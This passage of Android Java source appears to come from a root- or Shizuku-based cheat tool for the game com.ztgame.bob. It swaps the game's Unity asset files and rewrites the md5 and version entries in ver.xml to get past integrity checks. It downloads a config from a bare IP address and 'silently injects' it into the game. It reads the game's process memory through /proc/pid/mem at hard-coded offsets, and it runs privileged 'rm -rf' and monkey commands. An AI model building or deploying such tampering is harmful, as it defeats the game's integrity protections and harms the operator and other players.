                    Matcher m = Pattern.compile("<resver[^>]*ver=\"(\\d+)\"").matcher(result);
                    if (m.find()) remoteVer = m.group(1);
                } catch (Exception e) {}

                if (remoteVer.isEmpty()) {
                    runOnUiThread(() -> { Toast.makeText(NewActivity.this, "未解析到服务器版本号", Toast.LENGTH_SHORT).show(); launchGameAndExit(); });
                    return;
                }

                final String finalRemoteVer = remoteVer;
                new Thread(() -> {
                    try {
                        String xmlRelativePath = "files/vercache2022/android/ver.xml";
                        File localTempXml = new File(getExternalFilesDir(null), "temp_ver_edit.xml");

                        if (!copyFromAndroidData(xmlRelativePath, localTempXml)) {
                            runOnUiThread(() -> { Toast.makeText(NewActivity.this, "未读取到游戏 ver.xml", Toast.LENGTH_SHORT).show(); launchGameAndExit(); });
                            return;
                        }

                        StringBuilder contentBuilder = new StringBuilder();
                        boolean found = false;
                        boolean isSame = false;

                        try (BufferedReader br = new BufferedReader(new FileReader(localTempXml))) {
                            String line;
                            while ((line = br.readLine()) != null) {
                                if (line.contains("<resver")) {
                                    Matcher mLocal = Pattern.compile("ver=\"(\\d+)\"").matcher(line);
                                    if (mLocal.find() && mLocal.group(1).equals(finalRemoteVer)) isSame = true;
                                    line = line.replaceAll("ver=\"\\d+\"", "ver=\"" + finalRemoteVer + "\"");
                                    found = true;
                                }
                                contentBuilder.append(line).append("\n");
                            }
                        }

                        if (isSame) {
                            runOnUiThread(() -> { Toast.makeText(NewActivity.this, "版本一致: " + finalRemoteVer, Toast.LENGTH_SHORT).show(); launchGameAndExit(); });
                        } else if (found) {
                            try (FileWriter writer = new FileWriter(localTempXml)) { writer.write(contentBuilder.toString()); }
                            if (copyToAndroidData(localTempXml, xmlRelativePath)) {
                                runOnUiThread(() -> { Toast.makeText(NewActivity.this, "版本已更新为: " + finalRemoteVer, Toast.LENGTH_LONG).show(); launchGameAndExit(); });
                            } else {
                                runOnUiThread(() -> { Toast.makeText(NewActivity.this, "写入本地文件失败", Toast.LENGTH_SHORT).show(); launchGameAndExit(); });
                            }
                        } else {
                            runOnUiThread(() -> { Toast.makeText(NewActivity.this, "本地格式异常", Toast.LENGTH_SHORT).show(); launchGameAndExit(); });
                        }
                        if (localTempXml.exists()) localTempXml.delete();

                    } catch (Exception e) {
                        runOnUiThread(() -> { Toast.makeText(NewActivity.this, "发生异常", Toast.LENGTH_SHORT).show(); launchGameAndExit(); });
                    }
                }).start();
            }
        });
    }

    // 【修改点】：确保完美呼起球球大作战
    // 【Root 暴力拉起版】：直接使用底层指令无视一切限制拉起游戏
    private void launchGameAndExit() {
        try {
            // 呼叫 su 权限
            Process p = Runtime.getRuntime().exec("su");
            DataOutputStream os = new DataOutputStream(p.getOutputStream());
            // 使用 monkey 命令强行唤醒指定包名，这是底层最霸道、最稳定的启动方式
            os.writeBytes("monkey -p " + TARGET_PKG + " -c android.intent.category.LAUNCHER 1\n");
            os.writeBytes("exit\n");
            os.flush();

            // 我们不需要等它完全打开 (不用 p.waitFor())，指令发出去后底层自己会去执行
        } catch (Exception e) {
            e.printStackTrace();
        }

        // 游戏拉起指令已发送，助手完成使命，直接秒退
        finishAffinity();
        System.exit(0);
    }

    // ==========================================
    // 原有的业务逻辑区
    // ==========================================

    private void processSkinRemove() {
        Toast.makeText(this, "正在执行去皮肤...", Toast.LENGTH_SHORT).show();
        new Thread(() -> {
            try {
                File filesDir = getExternalFilesDir(null);
                String assetFileName = "shopconfig.unity3d_u_4a8cff7be4e75aac023cef580ff68a15";
                File localAssetFile = new File(filesDir, assetFileName);
                String targetRelativePath = "files/vercache2022/android/common/data/" + assetFileName;

                if (!localAssetFile.exists()) { runOnUiThread(() -> Toast.makeText(this, "本地资源丢失", Toast.LENGTH_SHORT).show()); return; }
                if (!copyToAndroidData(localAssetFile, targetRelativePath)) { runOnUiThread(() -> Toast.makeText(this, "写入失败", Toast.LENGTH_SHORT).show()); return; }

                String xmlRelativePath = "files/vercache2022/android/ver.xml";
                File localTempXml = new File(filesDir, "temp_ver_edit.xml");
                if (!copyFromAndroidData(xmlRelativePath, localTempXml)) return;

                StringBuilder contentBuilder = new StringBuilder();
                boolean found = false;
                try (BufferedReader br = new BufferedReader(new FileReader(localTempXml))) {
                    String line;
                    while ((line = br.readLine()) != null) {
                        if (line.contains("shopconfig.unity3d")) {
                            line = line.replaceAll("md5=\"[^\"]*\"", "md5=\"4a8cff7be4e75aac023cef580ff68a15\"");
                            found = true;
                        }
                        contentBuilder.append(line).append("\n");
                    }
                }
                if (found) {
                    try (FileWriter writer = new FileWriter(localTempXml)) { writer.write(contentBuilder.toString()); }
                    if (copyToAndroidData(localTempXml, xmlRelativePath)) runOnUiThread(() -> Toast.makeText(this, "去皮肤成功！", Toast.LENGTH_SHORT).show());
                }
                if (localTempXml.exists()) localTempXml.delete();
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }

    private void processActivityRemove() {
        Toast.makeText(this, "正在执行去活动...", Toast.LENGTH_SHORT).show();
        new Thread(() -> {
            try {
                File filesDir = getExternalFilesDir(null);
                String assetFileName = "activityconfig.unity3d_u_30c0aa8a66fbece47834003b8e3d3bf7";
                File localAssetFile = new File(filesDir, assetFileName);
                String targetRelativePath = "files/vercache2022/android/common/data/" + assetFileName;

                if (!localAssetFile.exists()) return;
                if (!copyToAndroidData(localAssetFile, targetRelativePath)) return;

                String xmlRelativePath = "files/vercache2022/android/ver.xml";
                File localTempXml = new File(filesDir, "temp_ver_edit.xml");
                if (!copyFromAndroidData(xmlRelativePath, localTempXml)) return;

                StringBuilder contentBuilder = new StringBuilder();
                boolean found = false;
                try (BufferedReader br = new BufferedReader(new FileReader(localTempXml))) {
                    String line;
                    while ((line = br.readLine()) != null) {
                        if (line.contains("activityconfig.unity3d")) {
                            line = line.replaceAll("md5=\"[^\"]*\"", "md5=\"30c0aa8a66fbece47834003b8e3d3bf7\"");
                            found = true;
                        }
                        contentBuilder.append(line).append("\n");
                    }
                }
                if (found) {
                    try (FileWriter writer = new FileWriter(localTempXml)) { writer.write(contentBuilder.toString()); }
                    if (copyToAndroidData(localTempXml, xmlRelativePath)) runOnUiThread(() -> Toast.makeText(this, "去活动成功！", Toast.LENGTH_SHORT).show());
                }
                if (localTempXml.exists()) localTempXml.delete();
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }

    private void combinedCopyAndVerifyFile(FunctionConfig config) {
        Toast.makeText(this, "正在处理: " + config.btnName, Toast.LENGTH_SHORT).show();
        new Thread(() -> {
            File localFile = new File(getExternalFilesDir(null), config.sourceAssetName);
            if (!localFile.exists()) { runOnUiThread(() -> Toast.makeText(this, "资源缺失", Toast.LENGTH_SHORT).show()); return; }
            if (copyToAndroidData(localFile, config.targetRelativePath)) {
                runOnUiThread(() -> Toast.makeText(this, config.btnName + " 成功！", Toast.LENGTH_SHORT).show());
            } else {
                runOnUiThread(() -> Toast.makeText(this, "失败，请检查授权", Toast.LENGTH_SHORT).show());
            }
        }).start();
    }

    private void combinedDeleteFile() {
        Toast.makeText(this, "正在清理...", Toast.LENGTH_SHORT).show();
        String[] targetFiles = {
                "files/vercache2022/android/common/data/alltextures/map1/caocongnew.unity3d_u_4",
                "files/vercache2022/android/common/data/alltextures/map3/partnerdunew.unity3d_u_4",
                "files/vercache2022/android/ver.xml"
        };
        new Thread(() -> {
            boolean allSuccess = true;
            for (String relativePath : targetFiles) { if (!deleteFromAndroidData(relativePath)) allSuccess = false; }
            boolean finalAllSuccess = allSuccess;
            runOnUiThread(() -> Toast.makeText(this, finalAllSuccess ? "清理完成" : "部分清理失败", Toast.LENGTH_SHORT).show());
        }).start();
    }

    private void processAddExit() {
        Toast.makeText(this, "正在获取服务器最新配置...", Toast.LENGTH_SHORT).show();
        Request request = new Request.Builder().url("http://156.243.244.97/share/1.txt").get().build();
        httpClient.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(@NonNull Call call, @NonNull IOException e) {
                runOnUiThread(() -> Toast.makeText(NewActivity.this, "获取失败，请检查网络", Toast.LENGTH_SHORT).show());
            }
            @Override public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                if (!response.isSuccessful() || response.body() == null) {
                    runOnUiThread(() -> Toast.makeText(NewActivity.this, "服务器响应异常", Toast.LENGTH_SHORT).show()); return;
                }
                String result = response.body().string();
                String bianyishijian = ""; String wjlj = "";
                try {
                    Matcher mTime = Pattern.compile("bianyishijian=\"([^\"]+)\"").matcher(result);
                    if (mTime.find()) bianyishijian = mTime.group(1);
                    Matcher mUrl = Pattern.compile("wjlj=\"([^\"]+)\"").matcher(result);
                    if (mUrl.find()) wjlj = mUrl.group(1);
                } catch (Exception e) {}
                if (wjlj.isEmpty()) { runOnUiThread(() -> Toast.makeText(NewActivity.this, "未获取到下载链接", Toast.LENGTH_SHORT).show()); return; }
                final String finalTime = bianyishijian; final String finalUrl = wjlj;
                runOnUiThread(() -> {
                    showNeuDialog("道具赛+部分模式", "最新编译时间：" + finalTime + "\n验证方法：闪击战查看退出按钮提示内容是否有变化\n\n即将开始下载并静默注入，请耐心等待...",
                            () -> downloadAndApplyExitConfig(finalUrl));
                });
            }
        });
    }

    private void downloadAndApplyExitConfig(String downloadUrl) {
        new Thread(() -> {
            try {
                Request request = new Request.Builder().url(downloadUrl).get().build();
                Response response = httpClient.newCall(request).execute();
                if (!response.isSuccessful() || response.body() == null) {
                    runOnUiThread(() -> Toast.makeText(this, "文件下载失败", Toast.LENGTH_SHORT).show());
                    return;
                }
                File tempFile = new File(getExternalFilesDir(null), "temp_config.unity3d");
                try (InputStream is = response.body().byteStream(); FileOutputStream fos = new FileOutputStream(tempFile)) {
                    byte[] buffer = new byte[8192];
                    int len;
                    while ((len = is.read(buffer)) != -1) fos.write(buffer, 0, len);
                }

                String md5 = getFileMD5(tempFile);
                if (md5 == null) {
                    runOnUiThread(() -> Toast.makeText(this, "文件校验失败", Toast.LENGTH_SHORT).show());
                    return;
                }

                String targetFileName = "config.unity3d_u_" + md5;
                File renamedFile = new File(getExternalFilesDir(null), targetFileName);
                if (renamedFile.exists()) renamedFile.delete();
                tempFile.renameTo(renamedFile);

                String targetRelativePath = "files/vercache2022/android/common/data/" + targetFileName;
                if (!copyToAndroidData(renamedFile, targetRelativePath)) {
                    runOnUiThread(() -> Toast.makeText(this, "文件写入游戏目录失败，请检查授权", Toast.LENGTH_SHORT).show());
                    return;
                }

                String xmlRelativePath = "files/vercache2022/android/ver.xml";
                File localTempXml = new File(getExternalFilesDir(null), "temp_ver_edit.xml");
                if (!copyFromAndroidData(xmlRelativePath, localTempXml)) {
                    runOnUiThread(() -> Toast.makeText(this, "读取游戏 ver.xml 失败", Toast.LENGTH_SHORT).show());
                    return;
                }

                StringBuilder contentBuilder = new StringBuilder();
                boolean found = false;
                try (BufferedReader br = new BufferedReader(new FileReader(localTempXml))) {
                    String line;
                    while ((line = br.readLine()) != null) {
                        // 【核心修复】：加上双引号和父目录，精准匹配 common/data/config.unity3d
                        // 这样就绝对不会误伤 shopconfig.unity3d 和 activityconfig.unity3d 了！
                        if (line.contains("\"common/data/config.unity3d\"")) {
                            line = line.replaceAll("md5=\"[^\"]*\"", "md5=\"" + md5 + "\"");
                            found = true;
                        }
                        contentBuilder.append(line).append("\n");
                    }
                }

                if (found) {
                    try (FileWriter writer = new FileWriter(localTempXml)) { writer.write(contentBuilder.toString()); }
                    if (copyToAndroidData(localTempXml, xmlRelativePath)) {
                        runOnUiThread(() -> Toast.makeText(this, "添加退出成功！", Toast.LENGTH_SHORT).show());
                    } else {
                        runOnUiThread(() -> Toast.makeText(this, "覆盖 ver.xml 失败", Toast.LENGTH_SHORT).show());
                    }
                } else {
                    runOnUiThread(() -> Toast.makeText(this, "未在 ver.xml 中找到 common/data/config.unity3d 节点", Toast.LENGTH_SHORT).show());
                }

                if (renamedFile.exists()) renamedFile.delete();
                if (localTempXml.exists()) localTempXml.delete();

            } catch (Exception e) {
                e.printStackTrace();
                runOnUiThread(() -> Toast.makeText(this, "发生异常: " + e.getMessage(), Toast.LENGTH_SHORT).show());
            }
        }).start();
    }

    private String getFileMD5(File file) {
        try {
            MessageDigest digest = MessageDigest.getInstance("MD5");
            FileInputStream fis = new FileInputStream(file);
            byte[] byteArray = new byte[8192]; int bytesCount;
            while ((bytesCount = fis.read(byteArray)) != -1) digest.update(byteArray, 0, bytesCount);
            fis.close();
            byte[] bytes = digest.digest();
            StringBuilder sb = new StringBuilder();
            for (byte b : bytes) sb.append(String.format("%02x", b));
            return sb.toString();
        } catch (Exception e) { return null; }
    }

    private void startMemoryHackProcess() {
        if (!new RootBeer(this).isRooted()) { Toast.makeText(this, "请获取Root权限", Toast.LENGTH_SHORT).show(); return; }
        new Thread(() -> {
            try {
                String finalAddress = resolvePointerChainAndGetAddress();
                int pid = getProcessID(TARGET_PKG);
                String msg = (pid > 0) ? "获取基址成功" : "游戏未运行";
                runOnUiThread(() -> { Toast.makeText(this, msg, Toast.LENGTH_LONG).show(); if (finalAddress != null) startFloatWindowAndGame(finalAddress); });
            } catch (Exception e) { runOnUiThread(() -> Toast.makeText(this, "获取失败，请先启动游戏", Toast.LENGTH_SHORT).show()); }
        }).start();
    }

    private String resolvePointerChainAndGetAddress() throws Exception {
        int pid = getProcessID(TARGET_PKG);
        if (pid <= 0) throw new Exception("游戏未运行");
        long unityBase = getModuleBaseAddress(pid, "libunity.so");
        if (unityBase == 0L) throw new Exception("libunity.so not found");
        long pointerAddr = unityBase + 0x1CC40L;
        long dereferenced = readMemoryLong(pid, pointerAddr);
        if (dereferenced <= 0L) throw new Exception("pointer read fail");
        return String.format("%x", dereferenced + 0xFCL);
    }

    private void startFloatWindowAndGame(String hexAddress) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            Toast.makeText(this, "请授予悬浮窗权限", Toast.LENGTH_SHORT).show();
            startActivityForResult(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName())), REQUEST_CODE_FLOAT_WINDOW);
            return;
        }
        Intent serviceIntent = new Intent(this, FloatWindowService.class);
        serviceIntent.putExtra("BASE_ADDRESS", hexAddress);
        startService(serviceIntent);
        Intent launchIntent = getPackageManager().getLaunchIntentForPackage(TARGET_PKG);
        if (launchIntent != null) startActivity(launchIntent);
    }

    private int getProcessID(String pkgName) {
        try {
            Process p = Runtime.getRuntime().exec("su"); DataOutputStream os = new DataOutputStream(p.getOutputStream());
            os.writeBytes("pidof " + pkgName + "\nexit\n"); os.flush();
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line = reader.readLine();
            if (line != null && !line.trim().isEmpty()) return Integer.parseInt(line.trim().split("\\s+")[0]);
        } catch (Exception e) {} return -1;
    }

    private long getModuleBaseAddress(int pid, String moduleName) {
        try {
            Process p = Runtime.getRuntime().exec("su"); DataOutputStream os = new DataOutputStream(p.getOutputStream());
            os.writeBytes("cat /proc/" + pid + "/maps\nexit\n"); os.flush();
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line; boolean foundSo = false;
            while ((line = reader.readLine()) != null) {
                if (line.contains(moduleName)) foundSo = true;
                if (foundSo && line.contains("[anon:.bss]")) {
                    String range = line.substring(0, line.indexOf(" "));
                    return new BigInteger(range.substring(0, range.indexOf("-")), 16).longValue();
                }
            }
        } catch (Exception e) {} return 0L;
    }

    private long readMemoryLong(int pid, long address) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", "dd if=/proc/" + pid + "/mem bs=1 count=8 skip=" + address + " 2>/dev/null"});
            InputStream in = p.getInputStream(); byte[] buffer = new byte[8]; int read = 0;
            while (read < 8) { int r = in.read(buffer, read, 8 - read); if (r == -1) break; read += r; }
            if (read == 8) return ByteBuffer.wrap(buffer).order(ByteOrder.LITTLE_ENDIAN).getLong();
        } catch (Exception e) {} return -1L;
    }

    private boolean copyToAndroidData(File localFile, String targetRelativePath) {
        String fullPath = "/storage/emulated/0/Android/data/" + TARGET_PKG + "/" + targetRelativePath;
        String dirOnly = fullPath.substring(0, fullPath.lastIndexOf("/"));
        if (executePrivilegedCommand("mkdir -p \"" + dirOnly + "\" && cp -f \"" + localFile.getAbsolutePath() + "\" \"" + fullPath + "\"")) return true;
        String uriStr = getSharedPreferences(PREFS_NAME, MODE_PRIVATE).getString(DATA_URI_KEY, null);
        if (uriStr != null) {
            try {
                DocumentFile targetDoc = getDocumentFileSafely(targetRelativePath, true, false);
                if (targetDoc != null) {
                    try (OutputStream out = getContentResolver().openOutputStream(targetDoc.getUri(), "wt"); InputStream in = new FileInputStream(localFile)) {
                        byte[] buffer = new byte[8192]; int read; while ((read = in.read(buffer)) != -1) out.write(buffer, 0, read);
                        return true;
                    }
                }
            } catch (Exception e) {}
        } return false;
    }

    private boolean copyFromAndroidData(String sourceRelativePath, File localDest) {
        String fullPath = "/storage/emulated/0/Android/data/" + TARGET_PKG + "/" + sourceRelativePath;
        if (executePrivilegedCommand("cp -f \"" + fullPath + "\" \"" + localDest.getAbsolutePath() + "\"")) return true;
        String uriStr = getSharedPreferences(PREFS_NAME, MODE_PRIVATE).getString(DATA_URI_KEY, null);
        if (uriStr != null) {
            try {
                DocumentFile sourceDoc = getDocumentFileSafely(sourceRelativePath, false, false);
                if (sourceDoc != null && sourceDoc.exists()) {
                    try (InputStream in = getContentResolver().openInputStream(sourceDoc.getUri()); OutputStream out = new FileOutputStream(localDest)) {
                        byte[] buffer = new byte[8192]; int read; while ((read = in.read(buffer)) != -1) out.write(buffer, 0, read);
                        return true;
                    }
                }
            } catch (Exception e) {}
        } return false;
    }

    private boolean deleteFromAndroidData(String relativePath) {
        String fullPath = "/storage/emulated/0/Android/data/" + TARGET_PKG + "/" + relativePath;
        // 【重要修改】将原来的 rm -f 改为 rm -rf，这样才能强制删除整个文件夹及其内部文件
        if (executePrivilegedCommand("rm -rf \"" + fullPath + "\"")) return true;

        try {
            DocumentFile target = getDocumentFileSafely(relativePath, false, false);
            if (target != null && target.exists()) return target.delete();
        } catch(Exception e) {}

        return false;
    }

    private DocumentFile getDocumentFileSafely(String relativePath, boolean createIfMissing, boolean isDirectory) {
        String uriStr = getSharedPreferences(PREFS_NAME, MODE_PRIVATE).getString(DATA_URI_KEY, null);
        if (uriStr == null) return null;
        DocumentFile current = DocumentFile.fromTreeUri(this, Uri.parse(uriStr));
        if (current == null) return null;
        String[] parts = relativePath.split("/");
        for (int i = 0; i < parts.length; i++) {
            String part = parts[i]; if (part.isEmpty()) continue;
            DocumentFile next = current.findFile(part);
            if (next == null) {
                if (createIfMissing) next = (i == parts.length - 1 && !isDirectory) ? current.createFile("*/*", part) : current.createDirectory(part);
                else return null;
            }
            current = next;
        } return current;
    }

    private boolean executePrivilegedCommand(String command) {
        try {
            if (Shizuku.checkSelfPermission() == PackageManager.PERMISSION_GRANTED) {
                Method m = Shizuku.class.getDeclaredMethod("newProcess", String[].class, String[].class, String.class);
                m.setAccessible(true); Process p = (Process) m.invoke(null, new Object[]{new String[]{"sh", "-c", command}, null, null}); return p.waitFor() == 0;
            }
        } catch (Throwable t) {}
        if (new RootBeer(this).isRooted()) {
            try { Process p = Runtime.getRuntime().exec("su"); DataOutputStream os = new DataOutputStream(p.getOutputStream()); os.writeBytes(command + "\nexit\n"); os.flush(); return p.waitFor() == 0; } catch (Exception e) {}
        } return false;
    }

    private void updatePermissionStatus(boolean hasPermission) {
        if (hasPermission) {
            if (layoutPermissionContainer.getVisibility() != View.GONE) {
                layoutPermissionContainer.setVisibility(View.GONE); layoutActionContainer.setVisibility(View.VISIBLE);
                layoutActionContainer.setAlpha(0f); layoutActionContainer.animate().alpha(1f).setDuration(500).start();
            }
            permissionStatus.setText("已授权"); permissionStatus.setTextColor(Color.parseColor("#48BB78"));
        } else {
            layoutPermissionContainer.setVisibility(View.VISIBLE); layoutActionContainer.setVisibility(View.GONE);
            permissionStatus.setText("未授权"); permissionStatus.setTextColor(Color.parseColor("#E53E3E"));
        }
    }

    private void checkHasPermission() {
        boolean shizukuOk = false;
        try { if (Shizuku.checkSelfPermission() == PackageManager.PERMISSION_GRANTED) shizukuOk = true; } catch (Throwable t) {}

        // 【修改1：严格验证Root】不能只靠检测系统环境，要真实执行su命令测试本软件是否拿到Root
        boolean rootOk = false;
        if (new RootBeer(this).isRooted()) {
            try {
                Process p = Runtime.getRuntime().exec("su");
                DataOutputStream os = new DataOutputStream(p.getOutputStream());
                os.writeBytes("id\nexit\n");
                os.flush();
                if (p.waitFor() == 0) rootOk = true;
            } catch (Exception e) {}
        }

        if (shizukuOk || rootOk) { updatePermissionStatus(true); return; }

        // 【修改2：严格验证SAF缓存】不仅要能读，还必须验证文件夹名字是不是真的球球目录
        String uriStr = getSharedPreferences(PREFS_NAME, MODE_PRIVATE).getString(DATA_URI_KEY, null);
        if (uriStr != null) {
            try {
                DocumentFile df = DocumentFile.fromTreeUri(this, Uri.parse(uriStr));
                if (df != null && df.canRead() && TARGET_PKG.equals(df.getName())) {
                    updatePermissionStatus(true); return;
                }
            } catch (Exception e) {}
        }

        // 都不满足，老老实实显示授权界面
        updatePermissionStatus(false);
    }

    private void copyAssetsToExternalFilesDir() {
        if (getSharedPreferences(PREFS_NAME, MODE_PRIVATE).getBoolean(PREF_ASSETS_COPIED, false)) return;
        File targetDir = getExternalFilesDir(null); if (!targetDir.exists()) targetDir.mkdirs();
        try {
            String[] files = getAssets().list("");
            if (files != null) {
                for (String f : files) {
                    try (InputStream in = getAssets().open(f); OutputStream out = new FileOutputStream(new File(targetDir, f))) { byte[] buf = new byte[1024]; int len; while ((len = in.read(buf)) != -1) out.write(buf, 0, len); } catch (IOException ignored) {}
                }
            }
        } catch (IOException ignored) {}
        getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit().putBoolean(PREF_ASSETS_COPIED, true).apply();
    }

    // ==========================================
    // 修改：直接跳转到目标目录的 SAF 授权
    // ==========================================
    // ==========================================
    // 修改：直接跳转到目标目录的 SAF 授权，并正确接管回调
    // ==========================================
    private void openDataDirectory() {
        Intent intent = new Intent(Intent.ACTION_OPEN_DOCUMENT_TREE);
        intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION
                | Intent.FLAG_GRANT_WRITE_URI_PERMISSION
                | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION
                | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION);

        String targetPath = "Android%2Fdata%2Fcom.ztgame.bob";
        Uri documentUri = Uri.parse("content://com.android.externalstorage.documents/document/primary%3A" + targetPath);

        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            intent.putExtra(android.provider.DocumentsContract.EXTRA_INITIAL_URI, documentUri);
        }

        try {
            // 【重要修复】：这里必须用 openDirectoryLauncher 启动，原有的持久化保存代码才会执行！
            openDirectoryLauncher.launch(intent);
            Toast.makeText(this, "请直接点击底部的【使用此文件夹】，如果提示隐私那么就放弃这种方式授权", Toast.LENGTH_LONG).show();
        } catch (Exception e) {
            e.printStackTrace();
            Toast.makeText(this, "你的系统不支持直接跳转，请手动寻找com.ztgame.bob目录", Toast.LENGTH_SHORT).show();
            // 降级兼容：普通打开方式
            Intent fallbackIntent = new Intent(Intent.ACTION_OPEN_DOCUMENT_TREE);
            openDirectoryLauncher.launch(fallbackIntent);
        }
    }


    private void handleShizuku() {
        try {
            if (!Shizuku.pingBinder()) { Toast.makeText(this, "Shizuku 未运行", Toast.LENGTH_SHORT).show(); return; }
            if (Shizuku.checkSelfPermission() != PackageManager.PERMISSION_GRANTED) Shizuku.requestPermission(REQUEST_CODE_SHIZUKU_PERMISSION);
        } catch (Throwable t) { Toast.makeText(this, "Shizuku 异常", Toast.LENGTH_SHORT).show(); }
    }

    private void handleRoot() { checkHasPermission(); }
    private void onRequestPermissionsResult(int c, int r) { if (c == REQUEST_CODE_SHIZUKU_PERMISSION) checkHasPermission(); }

    @Override protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_CODE_FLOAT_WINDOW) { if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.canDrawOverlays(this)) startMemoryHackProcess(); }
    }

    @Override protected void onDestroy() {
        super.onDestroy(); try { Shizuku.removeRequestPermissionResultListener(requestPermissionResultListener); } catch(Throwable t){}
    }
}